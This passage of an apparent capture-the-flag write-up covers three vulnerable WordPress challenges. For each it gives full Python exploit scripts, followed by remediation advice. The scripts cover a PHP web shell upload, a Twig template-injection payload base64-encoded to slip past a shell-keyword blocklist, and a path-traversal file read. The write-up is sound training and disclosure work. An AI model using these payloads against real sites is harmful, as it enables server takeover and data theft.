$file_type = wp_check_filetype( basename( $file['name'] ), array( 'jpg', 'jpeg', 'png' ) );
```

Upon further inspection of where the $file_type variable is used to validate file extensions, it turns out that this validation isn't enforced. This means the validation does not work, and we can upload a file with a .php extension.

Uploaded files will be stored in the /wp-content/uploads/woo-gallery/ directory.

```php
// ...
$upload_path = $upload_dir['basedir'] . '/woo-gallery/';
// ...
					if (move_uploaded_file( $file['tmp_name'], $upload_path . sanitize_file_name($file['name']) ) ) {

						$file_url = $upload_dir['baseurl'] . '/woo-gallery/' . sanitize_file_name($file['name']);
                        // ...
```

**Steps to Exploit:**

1. Enable User Registration
2. Create a user with a username that contains the word "admin."
3. Upload a malicious PHP file containing a web shell.
4. Read the FLAG from /flag.txt.

**Exploitation:**

```python
import requests
import io
from urllib.parse import *

URL = 'http://100.25.255.51:9090/'

class Exploit:
	def __init__(self, username, password, url=URL):
		self.url = url
		self.username = username
		self.password = password
		self.session = requests.session()

	def enableRegistration(self):
		req = self.session.get(urljoin(self.url, '/wp-json/woo-variations/v1/registration-enable/'))

		return '[+] Enable Registration Success' if req.status_code == 200 else '[+] Enable Registration Failed'

	def createUser(self):
		initSess = self.session.get(urljoin(self.url, '/wp-login.php?action=register'))
		data = {
		'user_login1': self.username,
		'user_email1': f'{self.username}@test.com',
		'user_password1': self.username,
		'wp-submit1': 'Register',
		'testcookie': 1
		}

		req = self.session.post(urljoin(self.url, 'wp-login.php?action=register'), data=data, allow_redirects=False)

		return '[+] Register Success' if req.status_code == 200 else '[+] Register Failed'

	def loginUser(self):
		initSess = self.session.get(urljoin(self.url, '/wp-login.php'))
		data = {
		'log': self.username,
		'pwd': self.password,
		'wp_submit': 'Log In',
		'testcookie': 1
		}

		req = self.session.post(urljoin(self.url, 'wp-login.php'), data=data, allow_redirects=False)

		return '[+] Login Successful' if req.status_code == 302 else '[+] Login Failed'

	def uploadShell(self):
		php_content = b'<?php system("cat /flag.txt"); ?>'

		files = {'gallery_picture': ('b4nua.php', io.BytesIO(php_content))}
		data = {
		'action': 'set_gallery_picture',
		'product_id': 1
		}

		req = self.session.post(urljoin(self.url, '/wp-admin/admin-ajax.php'), data=data, files=files)

		print(req.text)

		readFlag = self.session.get(urljoin(self.url, '/wp-content/uploads/woo-gallery/b4nua.php'))

		return readFlag.text

if __name__ == '__main__':
	username = 'b4nua_admin'
	password = username

	run = Exploit(username, password)
	print(run.enableRegistration())
	print(run.createUser())
	print(run.loginUser())
	print(run.uploadShell())
```

Run the exploit, and the FLAG is obtained.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/MyShopDisaster_Flag.png)

**Flag:** CTF{891241df84ff_ADMIN_PERMIT_ANYWAYS_0z195}

**Remediation:**

- Use wp_check_filetype_and_ext function. this function attempts to determine the real file type of a file. If unable to, the file name extension will be used to determine the type. If it’s determined that the extension does not match the file’s real type, then the “proper_filename” value will be set with a proper filename and extension.
- For the authorization, check the is_admin() && ! wp_doing_ajax()

# **Timberlake**

**Description:**\
I'm a front end designer that has some old backend experience. Wanted to put some of my skills to make a cool website that can work with templates. Still WIP but it is coming along nicely.
Note: fully whitebox challenge, no need to do massive bruteforce
http://100.25.255.51:9095/

**Analysis:**\
This challenge involved a custom WordPress Theme. We were provided with the source code to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. After performing a grep search and looking through the source code, there were no lines containing the FLAG. This suggested that the challenge might require Remote Code Execution (RCE) to obtain the FLAG.

Since this is a custom theme named timberlake-theme, I examined the index.php file of the theme. It turned out that the theme uses the Twig template engine (specifically template-home.twig). Given the use of Twig, the possibility of RCE became stronger, as the Twig template engine has known vulnerabilities to Server-Side Template Injection (SSTI).

```php
<?php
/* Template Name: Home Page */
$context = Timber::context();
$context['site_name'] = get_bloginfo('name');
$context['template_directory'] = get_template_directory_uri();
$context['index'] = urldecode(isset($_REQUEST['index'])) ? $_REQUEST['index'] : '';
$page = 'template-home.twig';
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
	$page = $_REQUEST['page'];
};
Timber::render($page, $context);
?>

```

**Vulnerable Code: Server Side Template Injection (STTI)**\
In the index.php file, there’s a part vulnerable to SSTI: when a user makes a request with the parameter "page", Twig renders the template provided by the user through the "page" parameter. However, if the "page" parameter is not set, Twig will render the template-home.twig file by default.

```php
// ...

$page = 'template-home.twig';
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
	$page = $_REQUEST['page'];
};
Timber::render($page, $context);

// ...
```

**Analysis: How to Write File?**\
In this vulnerable code, there is a validate() function that wraps the request for the "page". This function is located in the functions.php file.

```php
function is_timber_template($content) {
    $pattern = '/({\{.*?}\}|{\%.*?\%}|{\#.*?\#})/';
	if (preg_match($pattern, $content)) {
        return true;
    } else {
        return false;
    }
}

Timber::$dirname = array( '../../../../../../../../../../../../tmp', 'templates' );
function is_valid_template($content) {
    $pattern = '/\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\/bin|FILENAME)\b/i';
    if (preg_match($pattern, $content)) {
        return false;
    } else {
        return true;
    }
}

function validate($filename) {
    $fullPath = Timber::$dirname[0] . '/' . $filename;
    // Thanks to a report from Patchstack Researcher Darius Sveikauskas we are now validating both the file names and the content.
    if (isset($filename) && !empty($filename) && !in_array($filename, array('.php', '.htm', '.html', '.phtml', '.xhtml'))) {
        if(is_timber_template(file_get_contents($fullPath)) === true) {
            if(is_valid_template(file_get_contents($fullPath)) === true) {
                return 1;
            }
        }
    }
    return 0;

}
```

From the code, the validate function enforces the following checks:

1. The file extension must not contain .php, .htm, .html, .phtml, .xhtml.
2. The content of the file must include $pattern.
3. The content of the file must not include filter,system,cat,bash,bin,exec,\_self,env,dump,app,sort,tac,file_excerpt,\/bin,FILENAME. This acts as a blacklist.
4. The file’s location must be in ../../../../../../../../../../../../tmp.

Additionally, there is a save_session function that is accessible publicly (through wp_ajax_nopriv_save_session) at /wp-admin/admin-ajax.php?action=save_session. This function takes the "session_data" parameter via the $\_REQUEST method to set data in the session. $\_REQUEST is a PHP super global variable which contains submitted form data, and all cookie data. In other words, $\_REQUEST is an array containing data from $\_GET, $\_POST, and $\_COOKIE.

```php
function save_session() {
    start_session();
    if (isset($_REQUEST['session_data'])) {
        $_SESSION['session_data'] = stripslashes($_REQUEST['session_data']);
        wp_send_json_success('Data is saved to session.');
    } else {
        wp_send_json_error('Some error happened.');
    }
}
add_action('wp_ajax_save_session', 'save_session');
add_action('wp_ajax_nopriv_save_session', 'save_session');
```

We can exploit the save_session function to write an SSTI payload into a PHP session file and use it as a template to be rendered. By default, the session file is stored in the /tmp directory (Read [source](https://www.a2hosting.com/kb/developer-corner/php/using-php-sessions/)), which aligns with the template location defined in the validate function.

**Steps to Exploit:**\
From this analysis, the exploitation flow can be summarized as follows:

1. Write an SSTI payload into the PHP session file. Bypass the blacklist using base64.b64decode("e3tbInN0cmluZ3MgL2ZsYWcudHh0Il18bS5hcCgicGFzc3RocnUiKX19"). (Read [source](https://blog.sometimenaive.com/2020/04/10/twig3.x-ssti-payloads/)). Note: base64 only for escape this Jekyll Blog Post, you can decode it.
2. Render the template by using the PHP session file as the template via a GET request to /?page=sess\_{PHPSESSID}.

**Exploitation:**

```python
import requests
import base64
from urllib.parse import *

URL = 'http://100.25.255.51:9095/'

class Exploit:
	def __init__(self, url=URL):
		self.url = url
		self.session = requests.session()

	def injectSession(self):
        # base64 only for escape this Jekyll Blog Post
		data = {'action':'save_session','session_data':f'{base64.b64decode("e3tbInN0cmluZ3MgL2ZsYWcudHh0Il18bS5hcCgicGFzc3RocnUiKX19")}'}'
		req = self.session.post(urljoin(self.url, '/wp-admin/admin-ajax.php?action=save_session'), data=data)

		return req.text

	def renderTemplate(self):
		req = self.session.get(urljoin(self.url, f'?page=sess_{self.session.cookies.get_dict()["PHPSESSID"]}'))
		return req.text

if __name__ == '__main__':
	run = Exploit()
	run.injectSession()
	print(run.renderTemplate())
```

Run the exploit, and the FLAG is retrieved.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/Timberlake_Flag.png)

**Flag:** CTF{f0rc3d_sst1_ch4ll_zz4z2561}

**Remediation:**

- Sanitize user input before passing to Twig, use esc_attr or esc_html function
- Filter character that construct Twig render like `*%}{#`

# **Texting Trouble**

**Description:**\
I just installed a plugin to automate sending SMS to my clients. That's a great plugin with many options, I don't think it could cause a security issue, right?
This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).
http://100.25.255.51:9092/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code and a Docker setup to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. According to the Dockerfile, the FLAG is stored in the root directory ("/") with the name flag.txt.

```sh
FROM wordpress

COPY --chown=www-data:www-data challenge-custom/jotac/ /usr/src/wordpress/wp-content/plugins/jotac/
COPY challenge-custom/flag.txt /flag.txt
RUN chmod 0444 /flag.txt
```

After identifying that the FLAG is located in the root directory with the name flag.txt, I proceeded to search for actions that do not require privileges. I found three actions: process_forms, send_message_callback, and group_subscribe.

![No Priv Action](/assets/img/Patchstack-WCUS-CTF-2024/TextingTrouble_1.png)

It's important to note that the custom plugin used is called jotac. After reviewing the three functions handling these actions, I focused on the send_message_callback function because it includes user input and uses the file_get_contents function.

**Vulnerable Code: Arbitrary File Read**

```php
// ...
$formdata = $_POST['formdata'];
parse_str($formdata, $output);
$message            = sanitize_textarea_field($output['jotac-plugin-messages']['jot-message']);
$mess_type          = sanitize_text_field($output['jotac-plugin-messages']['jot-message-type']);
$mess_suffix        = sanitize_text_field($output['jotac-plugin-messages']['jot-message-suffix']);
$mess_attachment    = sanitize_text_field($output['jotac-plugin-messages']['jot-attachment']);
$jotmemkey          = sanitize_text_field($_POST['jotmemid']);
$jotseckey          = sanitize_text_field($_POST['sec']);

// ...
$wp_dir = wp_upload_dir();
$attachment_fp = $wp_dir['basedir'] . '/attachments/' . $mess_attachment;
// ...

if (in_array(basename($attachment_fp), $existing_files)) {
	$attachment_raw = file_get_contents($attachment_fp);
    echo $attachment_raw;
} else {
	$error = 6;
	$additional_error = "File does not exist among [".implode(', ', $existing_files)."]";
}
// ...
```

In the send_message_callback function above, there is a part that utilizes file_get_contents, where the variable $attachment_fp is passed as its value.

The variable $attachment_fp contains the path "/wp-content/uploads/" + '/attachments/' + $mess_attachment.

The variable $mess_attachment is user input received via the request parameter jotac-plugin-messages[jot-attachment]=file_to_read. The user input is sanitized to remove or escape characters like HTML tags or non-printable characters (Read [source](https://developer.wordpress.org/reference/functions/sanitize_text_field/)).

Other variables, such as $jotmemkey, must be in string format, while $jotseckey must match the key initiated in the plugin, which is $this->key = '6AGmIzDZktwJCaQt'; (from the jotac.php file).

```php
// ...
if (!empty($jotmemkey)) {
	list($jotgrpid,$jotmemid) = explode("-", $jotmemkey, 2);
	$member = $this->get_member($jotmemid);
}
if (empty($jotseckey) || JOTAC_Plugin()->key!==$jotseckey) {
    // Bail out
    die();
}
```

Additionally, there is another parameter, "level", with the value "verbose". This parameter ensures that the file being read is rendered; if not, the response will only return a JSON object with true for the attachment.

```php
if ($mess_attachment == '')
{
    $response = array('sent'=> "true", 'attachment'=> "false", 'errorcode' => $error, 'send_errors'=>$all_send_errors );
}
else{
	if ($_POST['level'] == 'verbose') {
		$response = array('sent'=> "true", 'attachment'=> esc_html(substr($attachment_raw, 0, 75)), 'errorcode' => $error, 'send_errors'=>$all_send_errors );
	}
	else{
		$response = array('sent'=> "true", 'attachment'=> "true", 'errorcode' => $error, 'send_errors'=>$all_send_errors );
		}
	}
```

From this analysis, we can conclude that it is possible to control the file being read through the $mess_attachment variable, leading to a Local File Inclusion (LFI) attack, as sanitize_text_field does not prevent Path Traversal.

**Steps to Exploit:**

1. This results in an Arbitrary File Read vulnerability in the send_message action, which triggers the send_message_callback function.

**Exploitation:**

```python
import requests
from urllib.parse import *

URL = 'http://100.25.255.51:9092/'

class Exploit:
	def __init__(self, url=URL):
		self.url = url

	def exploit(self):
		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		data = 'formdata=jotac-plugin-messages%5Bjot-message%5D%3DHello%26jotac-plugin-messages%5Bjot-message-type%5D%3Dsms%26jotac-plugin-messages%5Bjot-message-suffix%5D%3DBest%2Bregards%26jotac-plugin-messages%5Bjot-attachment%5D%3D%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fflag.txt&jotmemid=group-12345&sec=6AGmIzDZktwJCaQt&level=verbose'

		req = requests.post(urljoin(self.url, '/wp-admin/admin-ajax.php?action=send_message'), data=data, headers=headers)

		return req.text

if __name__ == '__main__':
	run = Exploit()
	print(run.exploit())
```

Run the exploit, and the FLAG is retrieved.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/TextingTrouble_Flag.png)

**Flag:** CTF{PSEUDOLIMITED_INCLUSION_0z471}

**Remediation:**

- Use sanitize_file_name function to prevent Path Traversal when reading local files.

Thank you for reading this article, i hope it was helpful :-D\
**Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**

[Linkedin]: https://www.linkedin.com/in/muhammad-ichwan-banua/
[Medium]: https://banua.medium.com
[Github]: https://github.com/banuaa
[Youtube]: https://www.youtube.com/@muhammad.iwn-banua
[Instagram]: https://www.instagram.com/muhammad.iwn
